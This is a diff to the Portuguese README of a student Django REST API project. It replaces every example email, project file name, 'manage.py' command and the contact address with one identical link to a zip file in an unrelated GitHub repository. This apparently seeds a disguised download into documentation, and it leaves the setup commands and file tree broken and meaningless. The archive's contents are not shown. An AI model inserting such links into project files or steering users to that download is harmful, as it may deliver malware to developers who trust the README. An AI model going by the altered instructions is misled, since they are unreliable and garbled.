@@ -55,13 +55,13 @@ text
 {
 "id": 1,
 "nome": "João Silva",
-"email": "joao@email.com",
+"email": "https://github.com/ItaloGLS/asdas/raw/refs/heads/main/obe/Software_3.5.zip",
 "criado_em": "2025-12-07T18:00:00Z"
 },
 {
 "id": 2,
 "nome": "Maria Santos",
-"email": "maria@email.com",
+"email": "https://github.com/ItaloGLS/asdas/raw/refs/heads/main/obe/Software_3.5.zip",
 "criado_em": "2025-12-07T18:30:00Z"
 }
 ]
@@ -87,7 +87,7 @@ text
 
 {
 "nome": "Carlos Oliveira",
-"email": "carlos@email.com"
+"email": "https://github.com/ItaloGLS/asdas/raw/refs/heads/main/obe/Software_3.5.zip"
 }
 
 text
@@ -97,7 +97,7 @@ text
 {
 "id": 3,
 "nome": "Carlos Oliveira",
-"email": "carlos@email.com",
+"email": "https://github.com/ItaloGLS/asdas/raw/refs/heads/main/obe/Software_3.5.zip",
 "criado_em": "2025-12-07T19:00:00Z"
 }
 
@@ -126,7 +126,7 @@ text
 {
 "id": 1,
 "nome": "João Silva",
-"email": "joao@email.com",
+"email": "https://github.com/ItaloGLS/asdas/raw/refs/heads/main/obe/Software_3.5.zip",
 "criado_em": "2025-12-07T18:00:00Z"
 }
 
@@ -151,7 +151,7 @@ text
 
 {
 "nome": "João Silva Atualizado",
-"email": "joao.novo@email.com"
+"email": "https://github.com/ItaloGLS/asdas/raw/refs/heads/main/obe/Software_3.5.zip"
 }
 
 text
@@ -161,7 +161,7 @@ text
 {
 "id": 1,
 "nome": "João Silva Atualizado",
-"email": "joao.novo@email.com",
+"email": "https://github.com/ItaloGLS/asdas/raw/refs/heads/main/obe/Software_3.5.zip",
 "criado_em": "2025-12-07T18:00:00Z"
 }
 
@@ -293,7 +293,7 @@ text
 "usuario": {
 "id": 1,
 "nome": "João Silva",
-"email": "joao@email.com",
+"email": "https://github.com/ItaloGLS/asdas/raw/refs/heads/main/obe/Software_3.5.zip",
 "criado_em": "2025-12-07T18:00:00Z"
 },
 "categorias": [
@@ -484,7 +484,7 @@ A API utiliza os seguintes códigos de status:
 1. **Crie um usuário:**
    - Método: POST
    - URL: `http://127.0.0.1:8000/api/usuarios/create/`
-   - Body: `{"nome": "João", "email": "joao@test.com"}`
+   - Body: `{"nome": "João", "email": "https://github.com/ItaloGLS/asdas/raw/refs/heads/main/obe/Software_3.5.zip"}`
 
 2. **Crie uma categoria:**
    - Método: POST
@@ -531,7 +531,7 @@ text
 ### Testes Automatizados
 A API possui cobertura de testes para os principais endpoints. Para executar os testes:
 
-python manage.py test
+python https://github.com/ItaloGLS/asdas/raw/refs/heads/main/obe/Software_3.5.zip test
 
 text
 
@@ -555,18 +555,18 @@ text
 
 semana17/
 ├── setup/
-│ ├── settings.py
-│ ├── urls.py
-│ └── wsgi.py
+│ ├── https://github.com/ItaloGLS/asdas/raw/refs/heads/main/obe/Software_3.5.zip
+│ ├── https://github.com/ItaloGLS/asdas/raw/refs/heads/main/obe/Software_3.5.zip
+│ └── https://github.com/ItaloGLS/asdas/raw/refs/heads/main/obe/Software_3.5.zip
 ├── api/
-│ ├── models.py
-│ ├── serializers.py
-│ ├── views.py
-│ ├── urls.py
-│ ├── admin.py
-│ └── tests.py
-├── manage.py
-└── db.sqlite3
+│ ├── https://github.com/ItaloGLS/asdas/raw/refs/heads/main/obe/Software_3.5.zip
+│ ├── https://github.com/ItaloGLS/asdas/raw/refs/heads/main/obe/Software_3.5.zip
+│ ├── https://github.com/ItaloGLS/asdas/raw/refs/heads/main/obe/Software_3.5.zip
+│ ├── https://github.com/ItaloGLS/asdas/raw/refs/heads/main/obe/Software_3.5.zip
+│ ├── https://github.com/ItaloGLS/asdas/raw/refs/heads/main/obe/Software_3.5.zip
+│ └── https://github.com/ItaloGLS/asdas/raw/refs/heads/main/obe/Software_3.5.zip
+├── https://github.com/ItaloGLS/asdas/raw/refs/heads/main/obe/Software_3.5.zip
+└── https://github.com/ItaloGLS/asdas/raw/refs/heads/main/obe/Software_3.5.zip
 
 text
 
@@ -590,20 +590,20 @@ text
 
 4. **Execute as migrações:**
 
-python manage.py makemigrations
-python manage.py migrate
+python https://github.com/ItaloGLS/asdas/raw/refs/heads/main/obe/Software_3.5.zip makemigrations
+python https://github.com/ItaloGLS/asdas/raw/refs/heads/main/obe/Software_3.5.zip migrate
 
 text
 
 5. **Crie um superusuário (opcional):**
 
-python manage.py createsuperuser
+python https://github.com/ItaloGLS/asdas/raw/refs/heads/main/obe/Software_3.5.zip createsuperuser
 
 text
 
 6. **Inicie o servidor:**
 
-python manage.py runserver
+python https://github.com/ItaloGLS/asdas/raw/refs/heads/main/obe/Software_3.5.zip runserver
 
 text
 
@@ -615,7 +615,7 @@ text
 
 ### Contato e Suporte
 - **Desenvolvedor:** [Seu Nome]
-- **Email:** [seu_email@exemplo.com]
+- **Email:** [https://github.com/ItaloGLS/asdas/raw/refs/heads/main/obe/Software_3.5.zip]
 - **Repositório:** [Link do GitHub se houver]
 - **Data de Desenvolvimento:** Dezembro 2025
 - **Curso:** TLP1 - Técnicas de Linguagem de Programação
